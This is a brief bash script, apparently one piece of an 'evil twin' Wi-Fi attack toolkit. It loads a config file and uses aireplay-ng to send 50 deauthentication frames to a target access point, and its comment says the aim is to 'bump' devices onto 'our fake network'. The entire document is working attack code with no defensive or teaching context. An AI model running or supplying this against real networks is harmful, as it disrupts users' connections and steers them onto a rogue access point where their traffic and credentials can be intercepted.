#! /bin/bash

# disconnect devices and bump them onto our fake network


CONFIG="eviltwin.config"
if test -f $CONFIG ; then
	source $CONFIG
else
	echo "Error: Unable to find '${CONFIG}'."
fi

REQUESTS=50
echo -e "Deauthorizing connected devices"
aireplay-ng --deauth $REQUESTS -a $BSSID $WLANMON --ignore-negative-one
